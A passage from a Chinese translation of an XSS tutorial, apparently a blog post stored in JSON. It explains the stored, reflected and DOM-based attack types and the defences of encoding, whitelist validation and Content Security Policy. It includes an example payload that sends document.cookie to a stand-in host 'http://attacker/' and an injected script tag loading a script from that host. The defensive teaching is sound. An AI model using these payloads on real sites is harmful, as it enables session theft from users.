cookies，将它们发送到自己的服务器，并用它们来获取像 session IDs 之类的敏感信息。 键盘记录：攻击者可以使用addEventListener 来登记一个键盘事件监听器，然后发送所有的用户按键记录到他自己的服务器，可能会记录像密码和银行卡号这样的敏感信息。 网络钓鱼：攻击者可以使用 DOM 操作在页面中插入假的登录表单，设置表单的 action 到自己的服务器，之后欺骗用户提交敏感信息。 尽管这些攻击有明显的不同，但它们都有一个关键的相似点：因为攻击者将代码注入了网站服务器的页面中，这些恶意代码将会在网站的上下文中运行。这意味着这些恶意代码会被网站当成普通代码对待：它可以访问受害者在该网站上的数据（例如：Cookies）和在URL中显示的主机名。无论出于什么目的和企图，恶意代码都会被当做网站上合法的一部分对待，可以做这个网站能做的任何事情。 这个事实强调了一个关键问题： 如果一个攻击者可以利用你的网站在其他人的浏览器上执行任意 JavaScript 代码，你的网站和用户的安全都是存在问题的。 为了强调这一点，教程中的一些示例将会适用&lt;script&gt;...&lt;/script&gt;省去恶意代码的细节。这表明能被注入代码的地方才是问题所在，而不是被执行的恶意代码。 二、XSS 攻击XSS攻击中的角色在我们描述 XSS 攻击的细节前，我们需要定义 XSS 攻击中涉及到的角色。事实上，一次 XSS 攻击涉及3个角色：网站、受害者和攻击者 。 网站提供 HTML 页面给请求它的用户。在我们的例子中，它位于 http://website/。 网站的数据库保存一些会被加载到网站页面的用户输入。 受害者是该网站的一名普通用户，用浏览器访问页面。 攻击者是该网站的一名恶意用户，尝试利用网站上的 XSS 漏洞来攻击受害者 攻击者的服务器是由他本人控制的网络服务器，唯一的目的是保存受害者的敏感信息。在我们的例子中，它位于 http://attacker/。 一个攻击场景示例在这个例子中，我们假设攻击者的最终目标是通过利用网站的 XSS 漏洞来偷窃受害者的 cookies。这可以通过在受害者的浏览器中执行下列代码实现： 123&lt;script&gt;window.location='http://attacker/?cookie='+document.cookie&lt;/script&gt; 这段代码将用户浏览器导航到一个不同的 URL，触发一个到攻击者服务器的 HTTP 请求。这段 URL 将受害者的 cookies 作为参数包含其中，这样攻击者就能在请求到达时获取到 cookies。一旦攻击者得到了 cookies，他就可以利用它来伪装成受害者，开展后续攻击。 从现在开始，上面这段代码将被称为恶意字符串或恶意脚本。 示例攻击的工作流程下面的图展示了攻击者是如何开展示例攻击的： 攻击者利用网站表单将恶意字符串插入网站数据库。 受害者从网站请求页面。 网站将恶意字符串从数据库中取出并包含在响应中发给受害者。 受害者浏览器执行包含在响应中的恶意脚本，发送受害者的 cookies 到攻击者的服务器。 XSS 的类型尽管 XSS 攻击的目标总是在受害者的浏览器中执行一些恶意代码，完成这个目标的方式还是会有些许区别。XSS 攻击通常被分为下面三类： 持久化 XSS：恶意代码通常来自网站数据库。 反射式 XSS：恶意代码通常来自用户请求。 基于 DOM 的XSS：漏洞通常在客户端而非服务端。 上一个例子里展示了持久化 XSS 攻击。现在我们将描述另外两种类型的 XSS 攻击：反射式 XSS 和 基于 DOM 的 XSS。 反射式 XSS在反射式 XSS 攻击中，恶意字符串是受害者向网页发出的 request 的一部分。网站之后会将包含恶意字符串的响应返回给用户。下图展示了该过程： 1.攻击者构造了一个包含恶意字符串的 URL 并发送给受害者。 2.受害者被欺骗，向网站发送 URL。 3.网站从 URL 中加载恶意代码作为响应。 4.受害者浏览器执行响应中的恶意代码，发送受害者的 cookies 到攻击者的服务器。 反射式 XSS 是如何成功的？首先反射式 XSS 看起来危害更小，因为它要求受害者自己来发送包含恶意字符串的请求。因为没有人愿意攻击他自己，这看起来没办法实施这种攻击。 然而事实证明，至少有两种方式会导致受害者自己启动反射式 XSS 来攻击他自己。 如果攻击者的目标是一个特定个体，攻击者可以发送恶意 URL 给受害者（例如使用电子邮箱、及时通讯方式等）并欺骗它们访问。 如果攻击者的目标是很多人，攻击者可以发布一个包含恶意 URL 的链接（例如在他自己的网站或社交网络上）并等待访问者点击。 这两种方法是相似的，并且在使用短链的情况下更可能成功，短链能遮挡住恶意字符串，防止被用户识别出来。 基于 DOM 的 XSS基于 DOM 的 XSS 是持久化和映射 XSS 的一个变种。在基于 DOM 的 XSS 攻击中，恶意字符串并没有被受害者的浏览器解析，直到网站的合法 JavaScript 代码被执行。下图展示了基于 DOM 的 XSS 攻击场景： 1.攻击者构造了一个包含恶意字符串的 URL 并发送给受害者。 2.受害者被攻击者欺骗，向网站发送 URL。 3.网站收到了请求，但并没有将恶意字符串包含在响应中。 4.受害者的浏览器执行了响应中的合法代码，造成恶意脚本被插入页面。 5.受害者的浏览器执行了页面中的恶意脚本，发送了受害者的 cookies 到攻击者的服务器。 ###基于 DOM 的 XSS 攻击不同的地方 在之前的关于持久化和映射的 XSS 攻击的例子中，服务器在页面中插入了恶意脚本，这将会作为发送给受害者的响应。当受害者的浏览器接收到响应后，它会把恶意脚本作为页面合法内容的一部分并自动在页面加载其它脚本的时候执行它。 然而在基于 DOM 的 XSS 攻击示例中，没有恶意代码被插入到页面中；唯一被自动执行的脚本是页面本身的合法脚本。问题在于合法脚本会直接利用用户输入在页面中添加 HTML 代码。因为恶意字符串是通过innerHTML 插入页面的，它将会被解析成 HTML，造成恶意脚本被执行。 不同之处很微妙但也很重要： 在传统的 XSS 中，恶意脚本作为页面的一部分🈶服务器发送并在页面被加载时执行。 在基于 DOM 的 XSS 攻击中，恶意脚本是在页面已经被加载一段时间后执行，由页面的合法代码用不安全的方式对待用户输入导致。 为什么基于 DOM 的 XSS 攻击很重要在之前的例子中，JavaScript 并不是必要的；服务器会自己生成所有的 HTML。如果服务端的代码是没有漏洞的，网站就不会受到 XSS 攻击。 然而，随着 Web 应用变得更加高级，HTML 代码通过客户端的 JavaScript 代码生成而不是通过服务端。任何时候内容都需要在不刷新整个页面的情况下改变，这种更新必须通过 JavaScript 执行。更为具体的，这种情况下，页面是通过一个 AJAX 请求后更新的。 这意味着 XSS 漏洞不仅会出现在你的网站的服务端代码，也会出现在客户端的 JavaScript 代码。因此，即使你的服务端代码是完全安全的，客户端代码也可能会因为在页面被加载后执行了包含用户输入的 DOM 更新而变得不安全。如果这种情况发生了，客户端代码就会在服务端没有问题的情况下触发 XSS 漏洞。 ##基于 DOM 的 XSS 对于服务端是不可见的 在基于 DOM 的 XSS 攻击中有一个非常特殊的地方，那就是恶意字符串从开始就没有被发送给服务端。浏览器没有发送恶意代码，所以服务器也就没有办法利用服务端代码进行检查。然而，客户端代码会用不安全的方式来处理它，从而导致 XSS 漏洞。 三、预防 XSS 攻击预防 XSS 的方法XSS 攻击实质上是一种代码注入：用户输入被错误的解释成了恶意程序代码。为了防止这种类型的代码注入，安全输入的处理是有必要的。对于 Web 开发者来说，有两种基本的方式来进行安全输入检查： 编码：这将转义用户输入，使得浏览器仅仅解释数据而非代码。 验证：过滤用户输入，使得浏览器解释代码而非恶意命令。 这是很基础的预防 XSS 的方法，它们有几点共同的特征，理解这些是非常重要的： Context：安全输入检查需要被区别对待，这取决于用户输入在页面的何处被插入。 Inbound/outbound： 安全输入检查既可以在你的网站接受输入（inbound）时执行，也可以在你的网站将输入插入到页面之前执行（outbound）。 Client/server：安全输入检查可以在客户端执行也可以在服务端，在某些情况下甚至都要执行。 在解释如何编码和验证的工作细节之前，我将先描述一下这些关键点。 输入检查上下文在网页中，用户输入可能会插入的地方会有许多上下文。对于每一种上下文，都必须遵循特定的规则使得用户输入不会打破自己的上下文和被解释成恶意代码。 为什么上下文很重要？在上面提到的上下文中，用户输入如果没有经过编码或验证就直接插入将会使得出现 XSS 漏洞的概率大幅提高。攻击者可以通过简单地插入分隔符并在后面加入恶意代码来进行注入攻击。 例如，网站如果直接将用户输入作为 HTML 属性插入，攻击者便能够通过在输入起始处输入引号来注入恶意代码，如下所示： 这是可以通过简单地删除所有用户输入中的引号避免的，仅仅在这种上下文中。如果同样的输入被注入到另一处上下文，结尾分隔符可能会改变，注入就很难成功了。因此，安全输入检查往往需要根据用户输入在哪被注入来进行定制。 Inbound/outbound 输入检查直观上看，好像所有的 XSS 问题都可以通过在网站接收到用户输入时对其进行编码或验证来防范。通过这种方式，任何恶意字符串都应该在被包含进页面时被过滤了。 就像上文提到的，问题在于，用户输入可以被插入页面的几处上下文中。没有很轻松的方法来判断什么时候用户输入会出现在它最终被注入的上下文中，而同样的用户输入通常需要被插入到不同的上下文中。依赖入站输入检查来预防 XSS 是非常脆弱的方法，并会导致一系列问题。（已经被废弃的 PHP 特性“magic quotes” 就是一个典型的例子。） 然而出站输入处理应该成为你对抗 XSS 的基本方法，因为它会考虑到用户输入将被插入处的具体上下文。而入站验证仍然可以成为第二道防线，我们会在之后讨论。 在哪执行安全输入检查在大多数现代的网站应用中，用户输入会同时被服务端和客户端处理。为了预防所有类型的 XSS 攻击，安全输入检查必须同时在客户端和服务端进行。 为了预防传统的 XSS 攻击，安全输入检查必须考虑服务端的代码。这可以通过服务器上使用的任何语言来支持。 为了预防基于 DOM 的 XSS 攻击，安全输入检查必须考虑客户端代码。这可以通过 JavaScript 代码来支持。 编码编码是一种转义用户输入的操作，使得浏览器仅仅解释数据而非代码。在 web 开发中最常使用的编码方式是 HTML 转义，这将把字符 ’&lt;‘ 和 ‘&gt;’分别转义成 ‘&amp;lt\\;’ 和 ‘&amp;gt\\;’ 。 下面的伪代码展示了用户输入时如何通过 HTML 转义编码并通过服务端脚本插入页面的： 1234print \"&lt;html&gt;\"print \"Latest comment: \"print encodeHtml(userInput)print \"&lt;/html&gt;\" 如果用户输入时字符串 … ,处理后的 HTML 将会如下： 1234&lt;html&gt;Latest comment:&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/html&gt; 因为有特殊含义的字符串都被转义了，浏览器将不会解释执行任何用户输入。 ####在客户端和服务端的编码 对客户端代码进行编码时，使用的语言一般是 JavaScript，它有内置函数来对不同上下文的数据编码。 对服务端代码进行编码时，你依赖服务端使用的语言或框架提供的函数。因为有大量的语言和框架可用，本篇教程将不会覆盖任何特定服务端语言或框架的编码细节。然而，当你在写服务端代码时，和客户端的 JavaScript 相似的编码函数是有用的。 在客户端的编码当在客户端使用 JavaScript 编码用户输入时，有几种内置方法和属性可以通过上下文敏感的方式自动编码所有数据： 上文提到的最后一个上下文（JavaScript 值）没有被包含进该表中，因为 JavaScript 并没有提供内置的方法来编码被包含进 JavaScript 源代码的数据。 编码的局限即使有编码，仍然有可能将恶意字符串注入一些上下文中。一个典型的例子就是用户输入被用来提供 URLs，例如下面这个例子： 1document.querySelector('a').href = userInput 即使赋值给 ‘href’ 属性会自动编码，使得所赋的值仅仅是一个属性值，这将无法阻止攻击者插入一段“javascript:”开头的 URL。当该链接被点击后，嵌入其中的 javascript 代码将会执行。 当你真的想让用户定义部分页面代码时，编码是一个不充分的解决方案。例如在用户的个人主页中，用户可以自定义 HTML。如果自定义的 HTML 被编码了，个人主页就只能包含纯文本。 在这种情况下，编码就需要验证来补充，这就是我们接下来会描述的。 验证验证是一种过滤用户输入的操作，它将恶意部分删除，保留必要的部分。在 web 开发中最常使用的验证方式之一就是允许一些 HTML 元素（例如 \\ 和 \\）禁止其它的（例如 \\）。 有两种主要的验证方法，它们在实现上有些区别： 分类策略：用户输入按黑名单和白名单被分类。 验证结果：被认定为恶意的用户输入会被拒绝或清除。 分类策略黑名单直观上看，通过规定不能在用户输入中出现的内容来定义一个禁止模板是很合适的验证方式。如果一个字符串匹配了这个模板，它将会被标记为不可用。例如允许用户提交除了javacript::之外的任何协议。这种策略称之为黑名单。 然而，黑名单有两个主要的缺点： 复杂：准确地描述所有可能的恶意字符串集合通常是一个非常复杂的任务。上文描述的策略无法通过简单地搜索字符串“javascript”实现，因为这将会遗漏掉这种形式“Javascript”（首字母大写）和“javascript:”（首字母被编码成数字和字符引用）。 过时：即使使用了完美的黑名单，在浏览器添加了新的可以被恶意使用的特性后，还是会失效。例如，在 HTML5 的 onmousewheel 属性被引入前使用的黑名单将无法阻止攻击者利用该属性来进行 XSS 攻击。这个缺点在 web 开发中尤其显著，因为它由多种技术组成并且经常更新。 因为这些缺点，将黑名单作为分类策略是非常不合适的。白名单通常是一个更安全的方法。 白名单白名单本质上和黑名单相反，不同于定义一个禁止模板，白名单定义一个认可模板，将不匹配模板的输入认定为非法的。 不同于之前的黑名单的例子，白名单的例子将允许用户只能提交包含 http: 和 https: 协议的URLs。如果有javascript: 协议，这种方法会自动标记 URLs 非法，也包括”Javascript:”或”javascript:”。 和黑名单相比，白名单有下列两点好处：简单：准确地描述安全字符串集合通常比描述恶意字符串集合简单。在浏览器中，用户输入仅仅需要包含非常有限的可用函数子集。这种情况下，白名单的简单性就显得尤其有效了。例如，上面的白名单仅仅允许用户使用http:和https:协议。这很简单，也能满足大部分用户的需求。 长寿：不同于黑名单，白名单通常不会在新特性被添加到浏览器时过时。例如，HTML 中的白名单验证仅仅允许 title属性出现在 HTML 元素中，即使在引入了 HTML5 中的 onmousewheel属性，也是安全的。 验证结果当输入被标记为无效时，下列的两个动作之一将会执行： 拒绝：输入被简单地拒绝，防止它在网站的任何地方使用。 清除：所有的无效输入都被删除，保留网站中允许使用的有效部分。 这两种方法中，“拒绝”是实现起来最简单的方法。也就是说，“清除”是更有用的，因为它允许来自用户的大范围的输入。例如，用户提交了身份证号码，一个“清除”线程会删除所有非数字字符来防止代码注入，同时允许用户在输入时选择是否加入连字符。 如果你决定实现“清除”方法时，你必须确保“清除”线程自身没有使用黑名单方法。例如，URL “Javascript:…”，当使用白名单方式确认为无效时，将被传递给“清除”线程简单地删除所有“javascript:”实例。出于这个考虑，在任何时候都应该考虑使用良好测试过的库和框架用于“清除”。 使用哪一种防御技术编码应该是你防御 XSS 的第一道防线，因为它的目的就是中和数据使它无法被解释成代码。在某些情况下，编码需要被验证补全。编码和验证应该用在出站的时候，因为只有当输入被加载进页面的时候，你才知道哪段上下文需要被编码和验证。 作为第二道防线，你应该使用入站验证来清除或拒绝明显无效的数据，例如使用javascript:协议的链接。虽然它无法提供完善的安全，但能为由于错误和异常导致的出站编码和验证无法执行的情况提供有效预警。 如果这两条防御能一直保持使用，你的网站将能够抵御 XSS 攻击。然而，由于创建和维护一个完整网站的复杂性，仅仅使用安全输入处理来完成完全的保护是非常困难的。而作为第三道防线，你应该充分利用内容安全策略（CSP）。 内容安全策略（CSP）仅仅使用安全输入检查防御 XSS 攻击的缺点在于即使一个很小的安全疏漏都会对你的网站造成危害。最近被称为内容安全策略（CSP）的网站标准可以缓解这种风险。 CSP 被用来约束浏览器查看你的页面，使得浏览器只能使用从信任源下载的资源。该资源可以是一段脚本，一个样式表，一张图片或者一些其它类型的被页面引用的文件。这意味着攻击者即使攻击成功在你的网站插入了恶意内容，CSP 可以防止它被执行。 CSP 可以用来执行下列规则： 拒绝非信任源：额外的资源只能从清楚定义的信任源集合中加载。 拒绝内联资源：内联的 JavaScript 和 CSS 将不会被执行。 拒绝 eval：JavaScript 的 eval() 将不会被执行。 CSP 实例在下面的例子中，攻击者已经成功在页面中注入了恶意代码： 1234&lt;html&gt;Latest comment:&lt;script src=\"http://attacker/malicious‑script.js\"&gt;&lt;/script&gt;&lt;/html&gt; 在一份合理定义的 CSP 策略的保护下，浏览器将不会加载并执行maliciout-script.js。因为http://attacter/ 不在 信任源集合中。尽管在这个示例中，网站没能成功处理用户输入，CSP 策略避免了这个漏洞造成任何实质性的伤害。 ####如何执行 CSP 默认情况下，浏览器不执行 CSP。为了让 CSP 在你的网站上执行，页面必须提供额外的 HTTP 头：Content-Security-Policy。任何提供了这种 http 头的页面将根据加载它的浏览器执行 CSP，浏览器本身需要支持CSP。 因为安全策略在每一次 HTTP 响应时都被发送，对服务器来说可能需要逐页设置。可以通过在每份响应中提供同样的 CSP 头来将同样的策略应用在整个网站上。 CSP头的值是一段定义了一个或多个在你的网站上生效的安全策略的字符串。字符串的语法将在下文描述。 注意：本节中的示例 HTTP 头出于清晰的目的用到了新行和缩进；这将不会出现在真实的 HTTP 头中。 CSP的语法CSP头的语法如下： 1234Content‑Security‑Policy: directive source‑expression, source‑expression, ...; directive ...; ... 语法由两个元素组成： “Directives” 是指定一种资源类型的字符串，来自预定义的列表。 “Source expressions” 是一套模板，用来描述一个或多个可以下载资源的服务器。 对于每个“directive”，给定的“source expressions”定义了哪种源服务器可以用来下载哪种特定类型的资源。 Directives可以用在 CSP 头中的 “directives”如下： connect‑src font‑src frame‑src img‑src media‑src object‑src script‑src style‑src 除此之外，还有一个特殊的”directive” default-src可以用来为所有没有包含在 CSP 头中的”directive”提供默认值。 Source expressions“source expressions”的语法如下： 1protocol://host‑name:port‑number 主机名可以用”.“开头，这意味着被提供的主机名的任何子域名都是允许的。同理，端口号也可以是”\\“，这表示所有的端口号都是被允许的。额外地，协议和端口号也可以省略。最后，协议也可由它自身给出，这使得所有资源通过 HTTPs 加载成为可能。 除了上述的语法之外，”source expression”可以选择有特殊意义的四个关键字之一（包括引号）： ‘none’:不允许任何资源。 ‘self’:允许提供页面的主机的资源。 ‘unsafe-inline’:允许嵌入页面的内联，例如：内联 \\元素， \\元素和 javascript: URLs。 ‘unsafe-eval’:允许使用 JavaScript 的 eval()。 注意，在 CSP 使用期间，内联资源和 eval()都是默认不允许的。使用’unsafe-inline’和’unsafe-eval’是唯一允许使用它们的方式。 策略实例12345Content‑Security‑Policy: script‑src &apos;self&apos; scripts.example.com; media‑src &apos;none&apos;; img‑src *; default‑src &apos;self&apos; http://*.example.com 在这个策略实例中，页面有下述限制： 脚本仅能从提供页面的主机和scripts.example.com`上下载。 音频和视频文件无法从任何地方下载。 图片文件可以从任何主机下载。 其他资源可以从提供页面的主机和任何 example.com的子域下载。 CSP 的状态直到2013年6月，内容安全协议都是 W3C 推荐的。它已经由浏览器供应商实现，但少部分还是浏览器特定的。特别地，在不同的浏览器中使用，HTTP 头是不同的。现在，可以通过查询你的网站将要支持的浏览器文档来获取更多信息。 四、总结##总结：XSS 概述 XSS 是一种代码注入攻击，使得不安全地处理用户输入成为可能。 一次成功的 XSS 攻击允许攻击者在受害者的浏览器上执行恶意代码。 一次成功的 XSS 攻击同时危害网站和用户的安全。 总结：XSS 攻击 XSS 攻击有三种主要类型： 持久化 XSS：恶意输入来自网站数据库。 反射式 XSS：恶意输入来自用户请求。 基于 DOM 的 XSS：漏洞在客户端代码而不是服务端代码。 所有这些攻击可以以不同发送进行，但都只有一个目的。 ##总结：预防 XSS 攻击 预防 XSS 攻击的最重要的方式就是进行安全输入检查。 大多数时候，”编码“在用户输入被加载进页面时执行。 在某些时候，”编码“需要被”验证“替换或补充。 安全输入检查必须考虑用户输入被插入处的页面上面上下文。 为了抵御所有类型的 XSS 攻击，安全输入检查必须同时在客户端和服务端进行。 内容安全策略在安全输入检查失效时提供一层额外的防御。 原文链接","link":"/2019/01/08/详解XSS（译）/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"Kaggle","slug":"Kaggle","link":"/tags/Kaggle/"},{"name":"LeetCode","slug":"LeetCode","link":"/tags/LeetCode/"},{"name":"React","slug":"React","link":"/tags/React/"},{"name":"shell wargames","slug":"shell-wargames","link":"/tags/shell-wargames/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"image segmentation","slug":"image-segmentation","link":"/tags/image-segmentation/"},{"name":"React Redux","slug":"React-Redux","link":"/tags/React-Redux/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"Web XSS","slug":"Web-XSS","link":"/tags/Web-XSS/"}],"categories":[{"name":"前端","slug":"前端","link":"/categories/前端/"},{"name":"数据挖掘","slug":"数据挖掘","link":"/categories/数据挖掘/"},{"name":"Algorithms","slug":"Algorithms","link":"/categories/Algorithms/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"操作系统","slug":"操作系统","link":"/categories/操作系统/"},{"name":"Deep Learning","slug":"Deep-Learning","link":"/categories/Deep-Learning/"}]}